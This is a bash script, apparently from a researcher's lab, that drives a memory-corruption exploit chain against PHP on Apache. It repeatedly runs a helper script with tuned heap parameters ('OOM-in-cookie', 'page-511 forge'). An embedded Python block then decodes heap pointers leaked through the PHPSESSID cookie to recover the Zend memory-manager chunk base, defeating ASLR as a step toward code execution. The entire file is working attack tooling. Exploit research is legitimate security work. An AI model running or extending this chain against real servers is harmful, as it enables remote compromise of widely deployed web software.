#!/bin/bash
# display_errors=0 chain demo: OOM-in-cookie A + page-511 forge B -> chunk base.
# This script NEVER changes display_errors; it refuses to run unless it is 0.
# Current result of this chain: Zend MM chunk base leak (stage-2/3 under
# display_errors=0 are still pending).
set -u
cd /home/debian/php2shell-work
S() { sudo -n "$@"; }
line() { printf '======================================================================\n'; }
say() { echo; line; echo "$*"; line; sleep 0.6; }

DE=$(grep -o 'php_admin_value display_errors [01]' /etc/apache2/conf-available/php8426.conf | awk '{print $NF}')
echo "display_errors=$DE (this script only validates it; it does not modify the configuration)"
if [ "$DE" != "0" ]; then
  echo "!! display_errors is not 0; set it yourself before running (this script does not change the configuration)"
  exit 1
fi
S cp g_bins.gdb /tmp/g_bins.gdb >/dev/null 2>&1

say "Environment and ASLR"
echo -n "kernel.randomize_va_space = "; cat /proc/sys/kernel/randomize_va_space
M=$(pgrep -o -x apache2 2>/dev/null)
W=$(pgrep -P "$M" -x apache2 2>/dev/null | tail -1)
if [ -n "${W:-}" ]; then
  echo -n "Current worker personality = "; S cat "/proc/$W/personality"
fi
echo "Note: trial_ab.sh starts Apache with ASLR_ON=1 (plain apache2ctl, no setarch -R)"

for attempt in 1 2 3; do
  say "Attempt $attempt: A OOM-in-cookie + B page-511 forge (display_errors=0)"
  ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
    ./trial_ab.sh 0 62 235 15000 208 0 4000 103 >/tmp/de0_attempt.log 2>&1

  echo "---- gdb / request summary"
  grep -aE "RESP_LEN|SEND_COOKIE|MM_SAFE_ERROR|PS_AT_OOM|OPEN_FILES|RSHUT_ID|GDB_ATTACH|WORKER_AFTER_A" /tmp/de0_attempt.log | tail -10
  if grep -aq "Content-Length: 0" /tmp/a_oom4.resp 2>/dev/null; then
    echo "A response: 500 + empty body (display_errors=0 is effective; the OOM produced no output)"
  fi

  echo "---- Decode Set-Cookie"
  python3 - <<'PY'
import re, urllib.parse
from collections import Counter
try:
    d=open('/tmp/b_open.resp','rb').read()
    m=re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?)(?:; path=/)?\r\n', d)
    if not m:
        print('NO_COOKIE'); raise SystemExit(1)
    val=urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
    if len(val) < 1000:
        print('COOKIE_LEN %d (page 511 not hit; retrying)' % len(val)); raise SystemExit(1)
    ptrs=[int.from_bytes(val[j:j+8],'little') for j in range(len(val)-8)]
    ptrs=[v for v in ptrs if 0x7f0000000000 <= v < 0x800000000000]
    c=Counter(v & ~0x1fffff for v in ptrs)
    base=c.most_common(1)[0][0]
    print('LEAK_DECODED %d bytes, PTRS %d, CHUNK_BASE %#x' % (len(val), len(ptrs), base))
    print('FIRST_PTRS ' + ' '.join('%#x' % v for v in ptrs[:6]))
    raise SystemExit(0)
except SystemExit:
    raise
except Exception as e:
    print('DECODE_ERR', e); raise SystemExit(1)
PY
  if [ $? -eq 0 ]; then
    say "Success: decoded the Zend MM chunk base from Set-Cookie with display_errors=0"
    echo "(This chain currently stops at the chunk base; the display_errors=0 port of stage-2/3 is still pending.)"
    exit 0
  fi
done

say "Missed page 511 three times; you can run it again"
exit 1
